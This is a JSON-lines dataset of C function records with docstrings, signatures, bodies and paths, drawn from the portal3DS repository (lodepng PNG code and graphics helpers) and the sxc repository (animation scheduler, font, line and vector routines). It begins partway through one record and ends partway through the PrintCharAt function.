!prof.alpha)\n    {\n      unsigned mask = (1u << mode_out->bitdepth) - 1u; /*profile always uses 16-bit, mask converts it*/\n      mode_out->key_r = prof.key_r & mask;\n      mode_out->key_g = prof.key_g & mask;\n      mode_out->key_b = prof.key_b & mask;\n      mode_out->key_defined = 1;\n    }\n  }\n\n  return error;\n}", "path": "source\\gfx\\lodepng.c", "repo_name": "smealum/portal3DS", "stars": 192, "license": "None", "language": "c", "size": 2567}
{"docstring": "// downscales by a factor of 2 on width and 2 on height\n", "func_signal": "void downscaleImage8(u8* data, int width, int height)", "code": "{\n\tif(!data || !width || !height)return;\n\n\tint i, j;\n\tfor(j=0; j<height; j++)\n\t{\n\t\tfor(i=0; i<width; i++)\n\t\t{\n\t\t\tconst u32 offset = (i+j*width);\n\t\t\tconst u32 offset2 = (i*2+j*2*width*2);\n\t\t\tdata[offset] = (data[offset2] + data[offset2+4] + data[offset2+width*2] + data[offset2+(width*2+1)]) / 4;\n\t\t}\n\t}\n}", "path": "source\\gfx\\texture.c", "repo_name": "smealum/portal3DS", "stars": 192, "license": "None", "language": "c", "size": 2567}
{"docstring": "/*the tree representation used by the decoder. return value is error*/\n", "func_signal": "static unsigned HuffmanTree_make2DTree(HuffmanTree* tree)", "code": "{\n  unsigned nodefilled = 0; /*up to which node it is filled*/\n  unsigned treepos = 0; /*position in the tree (1 of the numcodes columns)*/\n  unsigned n, i;\n\n  tree->tree2d = (unsigned*)lodepng_malloc(tree->numcodes * 2 * sizeof(unsigned));\n  if(!tree->tree2d) return 83; /*alloc fail*/\n\n  /*\n  convert tree1d[] to tree2d[][]. In the 2D array, a value of 32767 means\n  uninited, a value >= numcodes is an address to another bit, a value < numcodes\n  is a code. The 2 rows are the 2 possible bit values (0 or 1), there are as\n  many columns as codes - 1.\n  A good huffmann tree has N * 2 - 1 nodes, of which N - 1 are internal nodes.\n  Here, the internal nodes are stored (what their 0 and 1 option point to).\n  There is only memory for such good tree currently, if there are more nodes\n  (due to too long length codes), error 55 will happen\n  */\n  for(n = 0; n < tree->numcodes * 2; ++n)\n  {\n    tree->tree2d[n] = 32767; /*32767 here means the tree2d isn't filled there yet*/\n  }\n\n  for(n = 0; n < tree->numcodes; ++n) /*the codes*/\n  {\n    for(i = 0; i != tree->lengths[n]; ++i) /*the bits for this code*/\n    {\n      unsigned char bit = (unsigned char)((tree->tree1d[n] >> (tree->lengths[n] - i - 1)) & 1);\n      /*oversubscribed, see comment in lodepng_error_text*/\n      if(treepos > 2147483647 || treepos + 2 > tree->numcodes) return 55;\n      if(tree->tree2d[2 * treepos + bit] == 32767) /*not yet filled in*/\n      {\n        if(i + 1 == tree->lengths[n]) /*last bit*/\n        {\n          tree->tree2d[2 * treepos + bit] = n; /*put the current code in it*/\n          treepos = 0;\n        }\n        else\n        {\n          /*put address of the next step in here, first that address has to be found of course\n          (it's just nodefilled + 1)...*/\n          ++nodefilled;\n          /*addresses encoded with numcodes added to it*/\n          tree->tree2d[2 * treepos + bit] = nodefilled + tree->numcodes;\n          treepos = nodefilled;\n        }\n      }\n      else treepos = tree->tree2d[2 * treepos + bit] - tree->numcodes;\n    }\n  }\n\n  for(n = 0; n < tree->numcodes * 2; ++n)\n  {\n    if(tree->tree2d[n] == 32767) tree->tree2d[n] = 0; /*remove possible remaining 32767's*/\n  }\n\n  return 0;\n}", "path": "source\\gfx\\lodepng.c", "repo_name": "smealum/portal3DS", "stars": 192, "license": "None", "language": "c", "size": 2567}
{"docstring": "//LIGHTMAP\n", "func_signal": "void initLightDataLM(lightMapData_s* ld, u16 n)", "code": "{\n\tif(!ld)return;\n\n\tld->num=n;\n\tld->lmSize=vect3Di(0,0,0);\n\tld->buffer=NULL;\n\tld->coords=(lightMapCoordinates_s*)malloc(sizeof(lightMapCoordinates_s)*n);\n}", "path": "light\\source\\light_lightmap.c", "repo_name": "smealum/portal3DS", "stars": 192, "license": "None", "language": "c", "size": 2567}
{"docstring": "//LIGHTMAP\n", "func_signal": "void initLightDataLM(lightingData_s* ld, u16 n)", "code": "{\n\tif(!ld)return;\n\n\tld->type=LIGHTMAP_DATA;\n\tld->size=n;\n\tld->data.lightMap.lmSize=vect3Di(0,0,0);\n\tld->data.lightMap.buffer=NULL;\n\tld->data.lightMap.coords=(lightMapCoordinates_s*)malloc(sizeof(lightMapCoordinates_s)*n);\n\tld->data.lightMap.texture=NULL;\n}", "path": "source\\game\\light.c", "repo_name": "smealum/portal3DS", "stars": 192, "license": "None", "language": "c", "size": 2567}
{"docstring": "/*free the above pair again*/\n", "func_signal": "static void string_cleanup(char** out)", "code": "{\n  lodepng_free(*out);\n  *out = NULL;\n}", "path": "source\\gfx\\lodepng.c", "repo_name": "smealum/portal3DS", "stars": 192, "license": "None", "language": "c", "size": 2567}
{"docstring": "/*get the tree of a deflated block with fixed tree, as specified in the deflate specification*/\n", "func_signal": "static void getTreeInflateFixed(HuffmanTree* tree_ll, HuffmanTree* tree_d)", "code": "{\n  /*TODO: check for out of memory errors*/\n  generateFixedLitLenTree(tree_ll);\n  generateFixedDistanceTree(tree_d);\n}", "path": "source\\gfx\\lodepng.c", "repo_name": "smealum/portal3DS", "stars": 192, "license": "None", "language": "c", "size": 2567}
{"docstring": "/*color is not allowed to already exist.\nIndex should be >= 0 (it's signed to be compatible with using -1 for \"doesn't exist\")*/\n", "func_signal": "static void color_tree_add(ColorTree* tree,\n                           unsigned char r, unsigned char g, unsigned char b, unsigned char a, unsigned index)", "code": "{\n  int bit;\n  for(bit = 0; bit < 8; ++bit)\n  {\n    int i = 8 * ((r >> bit) & 1) + 4 * ((g >> bit) & 1) + 2 * ((b >> bit) & 1) + 1 * ((a >> bit) & 1);\n    if(!tree->children[i])\n    {\n      tree->children[i] = (ColorTree*)lodepng_malloc(sizeof(ColorTree));\n      color_tree_init(tree->children[i]);\n    }\n    tree = tree->children[i];\n  }\n  tree->index = (int)index;\n}", "path": "source\\gfx\\lodepng.c", "repo_name": "smealum/portal3DS", "stars": 192, "license": "None", "language": "c", "size": 2567}
{"docstring": "//----------------------\n//      VBO STUFF\n//----------------------\n", "func_signal": "int gsVboInit(gsVbo_s* vbo)", "code": "{\n\tif(!vbo)return -1;\n\n\tvbo->data=NULL;\n\tvbo->currentSize=0;\n\tvbo->maxSize=0;\n\tvbo->commands=NULL;\n\tvbo->commandsSize=0;\n\n\treturn 0;\n}", "path": "source\\gfx\\gs.c", "repo_name": "smealum/portal3DS", "stars": 192, "license": "None", "language": "c", "size": 2567}
{"docstring": "/*\nPaeth predicter, used by PNG filter type 4\nThe parameters are of type short, but should come from unsigned chars, the shorts\nare only needed to make the paeth calculation correct.\n*/\n", "func_signal": "static unsigned char paethPredictor(short a, short b, short c)", "code": "{\n  short pa = abs(b - c);\n  short pb = abs(a - c);\n  short pc = abs(a + b - c - c);\n\n  if(pc < pa && pc < pb) return (unsigned char)c;\n  else if(pb < pa) return (unsigned char)b;\n  else return (unsigned char)a;\n}", "path": "source\\gfx\\lodepng.c", "repo_name": "smealum/portal3DS", "stars": 192, "license": "None", "language": "c", "size": 2567}
{"docstring": "/*LODEPNG_COMPILE_DECODER*/\n", "func_signal": "static void setBitOfReversedStream(size_t* bitpointer, unsigned char* bitstream, unsigned char bit)", "code": "{\n  /*the current bit in bitstream may be 0 or 1 for this to work*/\n  if(bit == 0) bitstream[(*bitpointer) >> 3] &=  (unsigned char)(~(1 << (7 - ((*bitpointer) & 0x7))));\n  else         bitstream[(*bitpointer) >> 3] |=  (1 << (7 - ((*bitpointer) & 0x7)));\n  ++(*bitpointer);\n}", "path": "source\\gfx\\lodepng.c", "repo_name": "smealum/portal3DS", "stars": 192, "license": "None", "language": "c", "size": 2567}
{"docstring": "/*returns -1 if color not present, its index otherwise*/\n", "func_signal": "static int color_tree_get(ColorTree* tree, unsigned char r, unsigned char g, unsigned char b, unsigned char a)", "code": "{\n  int bit = 0;\n  for(bit = 0; bit < 8; ++bit)\n  {\n    int i = 8 * ((r >> bit) & 1) + 4 * ((g >> bit) & 1) + 2 * ((b >> bit) & 1) + 1 * ((a >> bit) & 1);\n    if(!tree->children[i]) return -1;\n    else tree = tree->children[i];\n  }\n  return tree ? tree->index : -1;\n}", "path": "source\\gfx\\lodepng.c", "repo_name": "smealum/portal3DS", "stars": 192, "license": "None", "language": "c", "size": 2567}
{"docstring": "/*returns 1 if success, 0 if failure ==> nothing done*/\n", "func_signal": "static unsigned uivector_resize(uivector* p, size_t size)", "code": "{\n  if(!uivector_reserve(p, size * sizeof(unsigned))) return 0;\n  p->size = size;\n  return 1; /*success*/\n}", "path": "source\\gfx\\lodepng.c", "repo_name": "smealum/portal3DS", "stars": 192, "license": "None", "language": "c", "size": 2567}
{"docstring": "/*returns 1 if success, 0 if failure ==> nothing done*/\n", "func_signal": "static unsigned ucvector_push_back(ucvector* p, unsigned char c)", "code": "{\n  if(!ucvector_resize(p, p->size + 1)) return 0;\n  p->data[p->size - 1] = c;\n  return 1;\n}", "path": "source\\gfx\\lodepng.c", "repo_name": "smealum/portal3DS", "stars": 192, "license": "None", "language": "c", "size": 2567}
{"docstring": "/*profile must already have been inited with mode.\nIt's ok to set some parameters of profile to done already.*/\n", "func_signal": "unsigned lodepng_get_color_profile(LodePNGColorProfile* profile,\n                                   const unsigned char* in, unsigned w, unsigned h,\n                                   const LodePNGColorMode* mode)", "code": "{\n  unsigned error = 0;\n  size_t i;\n  ColorTree tree;\n  size_t numpixels = w * h;\n\n  unsigned colored_done = lodepng_is_greyscale_type(mode) ? 1 : 0;\n  unsigned alpha_done = lodepng_can_have_alpha(mode) ? 0 : 1;\n  unsigned numcolors_done = 0;\n  unsigned bpp = lodepng_get_bpp(mode);\n  unsigned bits_done = bpp == 1 ? 1 : 0;\n  unsigned maxnumcolors = 257;\n  unsigned sixteen = 0;\n  if(bpp <= 8) maxnumcolors = bpp == 1 ? 2 : (bpp == 2 ? 4 : (bpp == 4 ? 16 : 256));\n\n  color_tree_init(&tree);\n\n  /*Check if the 16-bit input is truly 16-bit*/\n  if(mode->bitdepth == 16)\n  {\n    unsigned short r, g, b, a;\n    for(i = 0; i != numpixels; ++i)\n    {\n      getPixelColorRGBA16(&r, &g, &b, &a, in, i, mode);\n      if((r & 255u) != ((r >> 8) & 255u) || (g & 255u) != ((g >> 8) & 255u) ||\n         (b & 255u) != ((b >> 8) & 255u) || (a & 255u) != ((a >> 8) & 255u)) /*first and second byte differ*/\n      {\n        sixteen = 1;\n        break;\n      }\n    }\n  }\n\n  if(sixteen)\n  {\n    unsigned short r = 0, g = 0, b = 0, a = 0;\n    profile->bits = 16;\n    bits_done = numcolors_done = 1; /*counting colors no longer useful, palette doesn't support 16-bit*/\n\n    for(i = 0; i != numpixels; ++i)\n    {\n      getPixelColorRGBA16(&r, &g, &b, &a, in, i, mode);\n\n      if(!colored_done && (r != g || r != b))\n      {\n        profile->colored = 1;\n        colored_done = 1;\n      }\n\n      if(!alpha_done)\n      {\n        unsigned matchkey = (r == profile->key_r && g == profile->key_g && b == profile->key_b);\n        if(a != 65535 && (a != 0 || (profile->key && !matchkey)))\n        {\n          profile->alpha = 1;\n          alpha_done = 1;\n          if(profile->bits < 8) profile->bits = 8; /*PNG has no alphachannel modes with less than 8-bit per channel*/\n        }\n        else if(a == 0 && !profile->alpha && !profile->key)\n        {\n          profile->key = 1;\n          profile->key_r = r;\n          profile->key_g = g;\n          profile->key_b = b;\n        }\n        else if(a == 65535 && profile->key && matchkey)\n        {\n          /* Color key cannot be used if an opaque pixel also has that RGB color. */\n          profile->alpha = 1;\n          alpha_done = 1;\n        }\n      }\n\n      if(alpha_done && numcolors_done && colored_done && bits_done) break;\n    }\n  }\n  else /* < 16-bit */\n  {\n    for(i = 0; i != numpixels; ++i)\n    {\n      unsigned char r = 0, g = 0, b = 0, a = 0;\n      getPixelColorRGBA8(&r, &g, &b, &a, in, i, mode);\n\n      if(!bits_done && profile->bits < 8)\n      {\n        /*only r is checked, < 8 bits is only relevant for greyscale*/\n        unsigned bits = getValueRequiredBits(r);\n        if(bits > profile->bits) profile->bits = bits;\n      }\n      bits_done = (profile->bits >= bpp);\n\n      if(!colored_done && (r != g || r != b))\n      {\n        profile->colored = 1;\n        colored_done = 1;\n        if(profile->bits < 8) profile->bits = 8; /*PNG has no colored modes with less than 8-bit per channel*/\n      }\n\n      if(!alpha_done)\n      {\n        unsigned matchkey = (r == profile->key_r && g == profile->key_g && b == profile->key_b);\n        if(a != 255 && (a != 0 || (profile->key && !matchkey)))\n        {\n          profile->alpha = 1;\n          alpha_done = 1;\n          if(profile->bits < 8) profile->bits = 8; /*PNG has no alphachannel modes with less than 8-bit per channel*/\n        }\n        else if(a == 0 && !profile->alpha && !profile->key)\n        {\n          profile->key = 1;\n          profile->key_r = r;\n          profile->key_g = g;\n          profile->key_b = b;\n        }\n        else if(a == 255 && profile->key && matchkey)\n        {\n          /* Color key cannot be used if an opaque pixel also has that RGB color. */\n          profile->alpha = 1;\n          alpha_done = 1;\n          if(profile->bits < 8) profile->bits = 8; /*PNG has no alphachannel modes with less than 8-bit per channel*/\n        }\n      }\n\n      if(!numcolors_done)\n      {\n        if(!color_tree_has(&tree, r, g, b, a))\n        {\n          color_tree_add(&tree, r, g, b, a, profile->numcolors);\n          if(profile->numcolors < 256)\n          {\n            unsigned char* p = profile->palette;\n            unsigned n = profile->numcolors;\n            p[n * 4 + 0] = r;\n            p[n * 4 + 1] = g;\n            p[n * 4 + 2] = b;\n            p[n * 4 + 3] = a;\n          }\n          ++profile->numcolors;\n          numcolors_done = profile->numcolors >= maxnumcolors;\n        }\n      }\n\n      if(alpha_done && numcolors_done && colored_done && bits_done) break;\n    }\n\n    /*make the profile's key always 16-bit for consistency - repeat each byte twice*/\n    profile->key_r += (profile->key_r << 8);\n    profile->key_g += (profile->key_g << 8);\n    profile->key_b += (profile->key_b << 8);\n  }\n\n  color_tree_cleanup(&tree);\n  return error;\n}", "path": "source\\gfx\\lodepng.c", "repo_name": "smealum/portal3DS", "stars": 192, "license": "None", "language": "c", "size": 2567}
{"docstring": "/*returns 1 if success, 0 if failure ==> nothing done*/\n", "func_signal": "static unsigned ucvector_resize(ucvector* p, size_t size)", "code": "{\n  if(!ucvector_reserve(p, size * sizeof(unsigned char))) return 0;\n  p->size = size;\n  return 1; /*success*/\n}", "path": "source\\gfx\\lodepng.c", "repo_name": "smealum/portal3DS", "stars": 192, "license": "None", "language": "c", "size": 2567}
{"docstring": "/*write given buffer to the file, overwriting the file, it doesn't append to it.*/\n", "func_signal": "void save_file(const std::vector<unsigned char>& buffer, const std::string& filename)", "code": "{\n  std::ofstream file(filename.c_str(), std::ios::out|std::ios::binary);\n  file.write(buffer.empty() ? 0 : (char*)&buffer[0], std::streamsize(buffer.size()));\n}", "path": "source\\gfx\\lodepng.c", "repo_name": "smealum/portal3DS", "stars": 192, "license": "None", "language": "c", "size": 2567}
{"docstring": "/* Initialization */\n", "func_signal": "void InitLine(void)", "code": "{\n  CurX = CurY = 0;\n  Color = 0;\n}", "path": "to-translate\\xp32\\line.c", "repo_name": "burtonsamograd/sxc", "stars": 207, "license": "None", "language": "c", "size": 15940}
{"docstring": "/* A process which causes the cursor to blink on and off */\n", "func_signal": "static void BlinkCursorProc(unsigned long Arg)", "code": "{\n  static int CursorFlag = 0;\n  WINDOW Win = (WINDOW)Arg;\n \n  if(GetWinFontFlags(Win) & FONT_BLINK_CURSOR)\n\t{\n\t  if(CursorFlag)\n\t\t{\n\t\t  ShowFontCursor(Win, CursorFlag);\n\t\t  CursorFlag=!CursorFlag;\n\t\t}\n\t}\n  else\n\t{\n\t  ShowFontCursor(Win, GetWinFontFlags(Win) & FONT_SHOW_CURSOR);\n\t  KillCurProc();\n\t}\n}", "path": "to-translate\\xp32\\font.c", "repo_name": "burtonsamograd/sxc", "stars": 207, "license": "None", "language": "c", "size": 15940}
{"docstring": "/* Initialize the animation system */\n", "func_signal": "int InitFrameBasedAnimSystem(void)", "code": "{\n  /* Allocate the lists for the module */\n  ReadyQueue = ListCreate();\n  ExecutionQueue = ListCreate();\n  if(ReadyQueue == NULL || ExecutionQueue == NULL) return -1;\n\n  /* Initialize some varaibles */\n  RunFlag = 0;\n\n  return 0;\n}", "path": "to-translate\\xp32\\fbanim.c", "repo_name": "burtonsamograd/sxc", "stars": 207, "license": "None", "language": "c", "size": 15940}
{"docstring": "/* Print a string with delays between the characters */\n", "func_signal": "static void StutterString(unsigned long Arg)", "code": "{\n  static int Flag = 1;\n  STUTTER_PARAM *ps = (STUTTER_PARAM*)Arg;\n\n  /* If we are finished printing the string */\n  if(ps->Count == ps->Strlen)\n\t{\n\t  /* Decriment and check the delay value */\n\t  ps->EndDelay--;\n\t  if(ps->EndDelay <= 0)\n\t\t{\n\t\t  /* Stop the cursor from blinking */\n\t\t  StopBlinking = 1;\n\n\t\t  /* This proc is finished so set the flag again */\n\t\t  Flag = 1;\n\n\t\t  /* If the is another string to be printed after this one */\n\t\t  if(ps->Next)\n\t\t\t/* Print the next string */\n\t\t\tPrintStutterString(ps->Next);\n\n\t\t  /* Stop this from running */\n\t\t  KillCurProc();\n\n\t\t  /* Call the requested procedure */\n\t\t  if(ps->Proc)\n\t\t\tps->Proc(0);\n\t\t}\n\t  /* Start the cursor blinking while we wait */\n\t  else if(Flag)\n\t\t{\n\t\t  /* Insert the cursor proc */\n\t\t  BlinkCursor(ps->Win, 1);\n\n\t\t  /* Unset the flag so this does not happen again */\n\t\t  Flag = 0;\n\t\t}\n\n\t  /* Return here */\n\t  return;\n\t}\n\n  /* Print the char to the window */\n  PrintChar(ps->Win, ps->String[ps->Count]);\n\n  /* Increment the current character count */\n  ps->Count++;\n}", "path": "to-translate\\xp32\\font.c", "repo_name": "burtonsamograd/sxc", "stars": 207, "license": "None", "language": "c", "size": 15940}
{"docstring": "/* Stop the frame based anim system on the next context switch */\n", "func_signal": "int StopFrameBasedAnimSystem(void)", "code": "{\n  RunFlag = 0;\n\n  return 0;\n}", "path": "to-translate\\xp32\\fbanim.c", "repo_name": "burtonsamograd/sxc", "stars": 207, "license": "None", "language": "c", "size": 15940}
{"docstring": "/* Draw a line from the current cursor position to a new one */\n", "func_signal": "void LineTo(WINDOW Win, COOR x, COOR y)", "code": "{\n  Line(Win, CurX, CurY, x, y);\n  MoveTo(x, y);\n}", "path": "to-translate\\xp32\\line.c", "repo_name": "burtonsamograd/sxc", "stars": 207, "license": "None", "language": "c", "size": 15940}
{"docstring": "/* Add vector b to vector a, leaving b unchanged */\n", "func_signal": "void AddVector(VECTOR *a, VECTOR *b)", "code": "{\n  a->x += b->x;\n  a->y += b->y;\n  a->z += b->z;\n}", "path": "to-translate\\xp32\\vector.c", "repo_name": "burtonsamograd/sxc", "stars": 207, "license": "None", "language": "c", "size": 15940}
{"docstring": "/* Start or stop the cursor from blinking */\n", "func_signal": "void BlinkCursor(WINDOW Win, int Flag)", "code": "{\n  if(Flag && !(GetWinFontFlags(Win) & FONT_BLINK_CURSOR))\n\t{\n\t  SetWinFontFlags(Win, GetWinFontFlags(Win)|FONT_BLINK_CURSOR);\n\t  DynamicInsertProc(-1, 8, HIGH, BlinkCursorProc, (unsigned long)Win);\n\t}\n  else\n\tSetWinFontFlags(Win, GetWinFontFlags(Win)&~FONT_BLINK_CURSOR);\n}", "path": "to-translate\\xp32\\font.c", "repo_name": "burtonsamograd/sxc", "stars": 207, "license": "None", "language": "c", "size": 15940}
{"docstring": "/* Update the execution list for the next frame */\n", "func_signal": "static int Reschedual(void)", "code": "{\n  PROC *ExecProc;\n  PROC *ReadyProc;\n  \n  /* Prune the execution list by removing any procedures that\n\t are not to be run on the next frame */\n  ExecProc = (PROC*)ListFirst(ExecutionQueue);\n  while(ExecProc != NULL)\n\t{\n\n\t  if(ExecProc->NextFrame != FrameCounter ||\n\t\t ExecProc->EndFrame < FrameCounter)\n\t\t{\n\t\t  ListRemove(ExecutionQueue);\n\t\t  AddProcToQueue(ReadyQueue, ExecProc);\n\t\t  ExecProc = ListCurr(ExecutionQueue);\n\t\t}\n\t  else\n\t\t{\n\t\t  ExecProc = ListNext(ExecutionQueue);\n\t\t}\n\t}\n\n  /* Add the procs in the queue to the proc list */\n  ReadyProc = (PROC*)ListFirst(ReadyQueue);\n  while(ReadyProc != NULL)\n\t{\n\t  /* If this proc has expired, remove it from the ready queue */\n\t  if(ReadyProc->EndFrame < FrameCounter)\n\t\t{\n\t\t  PROC *Temp = ListRemove(ReadyQueue);\n\t\t  free(Temp);\n\t\t}\n\t  /* If this proc is to be run, add it to the execution queue */\n\t  else if(ReadyProc->NextFrame == FrameCounter)\n\t\t{\n\t\t  ListRemove(ReadyQueue);\n\t\t  AddProcToQueue(ExecutionQueue, ReadyProc);\n\t\t}\n\t  /* If this frame has a next frame greater than the current frame,\n\t\t diregard the rest of the list, since all procs are sorted by\n\t\t their next frame */\n\t  else if(ReadyProc->NextFrame > FrameCounter)\n\t\t{\n\t\t  break;\n\t\t}\n\t  ReadyProc = ListCurr(ReadyQueue);\n\t}\n\n  /* If the proc list is empty, then return a non-zero value */\n  return ((ListCount(ExecutionQueue) == 0) &&\n\t\t  (ListCount(ReadyQueue) == 0));\n}", "path": "to-translate\\xp32\\fbanim.c", "repo_name": "burtonsamograd/sxc", "stars": 207, "license": "None", "language": "c", "size": 15940}
{"docstring": "/* Add the given procedure to the proc queue */\n", "func_signal": "int AddProcToQueue(HLIST List, PROC *Proc)", "code": "{\n  PROC *TempProc;\n\n  /* Get the first procedure on the proc queue */\n  TempProc = ListFirst(List);\n\n  /* Sort by starting frame.  Stop sorting as soon as a proc\n     with the same next frame number is reached */\n  while((TempProc != NULL) && (TempProc->NextFrame < Proc->NextFrame))\n\t{\n\t  TempProc = ListNext(List);\n\t}\n\t  \n  /* Sort by priority.  If there are any proc's with the same priority\n     as this one, place them in sequential in the order they were\n\t inserted.   Stop as soon as a proc with a lower priority is\n\t found.  */\n  if((TempProc != NULL) && (TempProc->NextFrame == Proc->NextFrame))\n\t{\n\t  while((TempProc != NULL) && (TempProc->Priority >= Proc->Priority)\n\t\t\t&& (TempProc->NextFrame == Proc->NextFrame))\n\t\t{\n\t\t  TempProc = ListNext(List);\n\t\t}\n\t}\n\n  /* Add the new procedure to the proc queue */\n  /* If TempProc is NULL, this means that we ran off the end of\n\t the list.  In this case the proc is added to the end.  If the\n\t end of the list was not reached, the proc is inserted before\n\t the last item that it was compared to (the one which caused the\n\t conditional to fail). */\n  if(TempProc == NULL)\n\treturn ListAppend(List, Proc);\n  else\n\treturn ListInsert(List, Proc);\n}", "path": "to-translate\\xp32\\fbanim.c", "repo_name": "burtonsamograd/sxc", "stars": 207, "license": "None", "language": "c", "size": 15940}
{"docstring": "/* Perform a normal a.b dor product */\n", "func_signal": "SCALAR DotVector(VECTOR *a, VECTOR *b)", "code": "{\n  double Temp;\n\n  Temp = a->x*b->x;\n  Temp += a->y*b->y;\n  Temp += a->z*b->z;\n  Temp += a->w*b->w;\n\n  return Temp;\n}", "path": "to-translate\\xp32\\vector.c", "repo_name": "burtonsamograd/sxc", "stars": 207, "license": "None", "language": "c", "size": 15940}
{"docstring": "/* Cursor (logo) based line drawing */\n", "func_signal": "void MoveTo(COOR x, COOR y)", "code": "{\n  CurX = x;\n  CurY = y;\n}", "path": "to-translate\\xp32\\line.c", "repo_name": "burtonsamograd/sxc", "stars": 207, "license": "None", "language": "c", "size": 15940}
{"docstring": "/* Insert a procedure that takes no arguments into the proc queue */\n", "func_signal": "int InsertProc(unsigned long StartFrame, unsigned long EndFrame,\n\t\t\t   unsigned long Period, PRIORITY Priority, \n\t\t\t   void *Func, unsigned long Arg)", "code": "{\n  PROC *NewProc;\n\n  /* FIX ME!! The system will block if a process is added *while running*\n\t and the start frame is less than or equal to the current frame */\n\n  /* Create the new proc structure */\n  NewProc = (PROC*)malloc(sizeof(*NewProc));\n  if(NewProc == NULL) return -1;\n\n  NewProc->StartFrame = StartFrame;\n  NewProc->EndFrame = EndFrame;\n  NewProc->NextFrame = StartFrame;\n  NewProc->Period = Period;\n  NewProc->Priority = Priority;\n  NewProc->Func = Func;\n  NewProc->Arg = Arg;\n  \n  return AddProcToQueue(ReadyQueue, NewProc);\n}", "path": "to-translate\\xp32\\fbanim.c", "repo_name": "burtonsamograd/sxc", "stars": 207, "license": "None", "language": "c", "size": 15940}
{"docstring": "/* Perform a normal axb cross product */\n", "func_signal": "void CrossVector(VECTOR *result, VECTOR *a, VECTOR *b)", "code": "{\n  result->x = a->y*b->z - a->z*b->y;\n  result->y = a->z*b->x - a->x*b->z;\n  result->z = a->x*b->y - a->y*b->x;\n}", "path": "to-translate\\xp32\\vector.c", "repo_name": "burtonsamograd/sxc", "stars": 207, "license": "None", "language": "c", "size": 15940}
{"docstring": "/* Run the system based on the contents of the current queue */\n", "func_signal": "int RunFrameBasedAnimSystem(void)", "code": "{\n  /* Set the run flag */\n  RunFlag = 1;\n\n  /* Perform a proc list update */\n  if(Reschedual()) return -1;\n\n  /* Do until break */\n  while(RunFlag)\n\t{\n\t  CurProc = (PROC*)ListFirst(ExecutionQueue);\n\t  while(CurProc)\n\t\t{\n\t\t  /* Run the procedure */\n\t\t  RunProc(CurProc);\n\n\t\t  /* If we have gone too long, end this sequence of procs and\n\t\t\t go to the next frame */\n#if 0\n\t\t   if(inp(0x3da /* VGA_STATUS_REGISTER*/ ) & 0x08) assert(0);\n#endif\n\t\t  /* Get the next proc to be run */\n\t\t  CurProc = ListNext(ExecutionQueue);\n\t\t}\n\t  IncFrameCounter();\n\t  /*\t  WaitForVerticalBlank(0);*/\n\t  if(Reschedual()) break;\n\t} \n\n  return 0;\n}", "path": "to-translate\\xp32\\fbanim.c", "repo_name": "burtonsamograd/sxc", "stars": 207, "license": "None", "language": "c", "size": 15940}
{"docstring": "/* Normalize a vector */\n", "func_signal": "void NormVector(VECTOR *v)", "code": "{\n  SCALAR Temp;\n\n  Temp = AbsVector(v);\n  Temp = 1/Temp;\n  v->x *= Temp;\n  v->y *= Temp;\n  v->z *= Temp;\n}", "path": "to-translate\\xp32\\vector.c", "repo_name": "burtonsamograd/sxc", "stars": 207, "license": "None", "language": "c", "size": 15940}
{"docstring": "/* Print a character to the screen at the current cursor position */\n", "func_signal": "int PrintChar(WINDOW Window, char c)", "code": "{\n\n  EraseFontCursor(Window);\n\n  /* Draw the character */\n  PrintCharAt(Window, c, GetWinCursorX(Window), GetWinCursorY(Window));\n\n  switch(c)\n\t{\n\t  case '\\n':\n\t\tSetWinCursorX(Window, GetWinStartCol(Window));\n\t\tSetWinCursorY(Window, GetWinCursorY(Window)+FontHeight);\n\t\tbreak;\n\n\t  case '.':\n\t  case ':':\n\t\tSetWinCursorX(Window, GetWinCursorX(Window)+5);\n\t\tbreak;\n\n\t  default:\n\t\tSetWinCursorX(Window, GetWinCursorX(Window)+FontWidth);\n\t}\n\n\n  /* If the next character to be drawn will fall outside of the window */\n  if(GetWinCursorX(Window) + FontWidth >= GetWinWidth(Window))\n\t{\n\t  /* If autofill (linewrap) was requested */\n\t  if(GetWinFontFlags(Window) & FONT_AUTOFILL)\n\t\t {\n\t\t   /* Print out a newline to go to the next line */\n\t\t   PrintChar(Window, '\\n');\n\t\t }\n\t  else\n\t\t{\n\t\t  /* Move the cursor back so that the next\n\t\t\t character won't fall outside the window */\n\t\t  SetWinCursorX(Window, GetWinCursorX(Window)-FontWidth);\n\t\t}\n\t}\n\n  /* Scroll the window for if autoscrolling is desired */\n  if(GetWinCursorY(Window) + FontHeight >= GetWinHeight(Window))\n\t{\n\tif(GetWinFontFlags(Window) & FONT_AUTOSCROLL)\n\t\t{\n\t\tScrollWindowUp(Window, FontHeight);\n\t\t}\n\tSetWinCursorY(Window, GetWinCursorY(Window)-FontHeight);\n\t}\n\n  /* Draw the cursor */\n  if(GetWinFontFlags(Window) & FONT_SHOW_CURSOR)\n\t{\n\t  DrawFontCursor(Window);\n\t}\n\n  return 0;\n}", "path": "to-translate\\xp32\\font.c", "repo_name": "burtonsamograd/sxc", "stars": 207, "license": "None", "language": "c", "size": 15940}
{"docstring": "/* Run the given procedure based on its procedure definition structure */\n", "func_signal": "static void RunProc(PROC *Proc)", "code": "{\n  Proc->Func(Proc->Arg);\n  Proc->NextFrame = FrameCounter+Proc->Period;\n}", "path": "to-translate\\xp32\\fbanim.c", "repo_name": "burtonsamograd/sxc", "stars": 207, "license": "None", "language": "c", "size": 15940}
{"docstring": "/* Print a font character at the given location */\n", "func_signal": "int PrintCharAt(WINDOW Window, int c, int x, int y)", "code": "{\n  unsigned char *TempScreen;\n  unsigned char *TempFont;\n  int i, j;\n\n\n  /* Calculate the proper offset into the font table */\n  if(isupper(c))\n\t{\n\t  c -= 'A';\n\t  c *= 8;\n\t}\n  else if(islower(c))\n\t{\n\t  c -= 'a';\n\t  c *= 8;\n\t  c += FontBufferWidth*FontHeight;\n\t}\n  else if(isdigit(c))\n\t{\n\t  c -= '0';\n\t  c *= 8;\n\t  c += FontBufferWidth*FontHeight*2;\n\t}\n  else if(c == '.')\n\t{\n\t  /* Draw a period */\n\t  TempScreen = GetWinSurface(Window) + x + y*GetWinPitch(Window);\n\t  TempScreen += GetWinPitch(Window)*7 + 1;\n\n\t  *TempScreen = GetWinFontColor(Window);\n\t  *(TempScreen+1) = GetWinFontColor(Window);\n\n\t  return 0;\n\t}\n  else if(c == ':')\n\t{\n\n\t  /* Draw a colon */\n\t  TempScreen = GetWinSurface(Window) + x + y*GetWinPitch(Window);\n\t  TempScreen += 1 + GetWinPitch(Window);\n\n\t  *TempScreen = GetWinFontColor(Window);\n\t  *(TempScreen+1) = GetWinFontColor(Window);\n\t  TempScreen += GetWinPitch(Window);\n\t  *TempScreen = GetWinFontColor(Window);\n\t  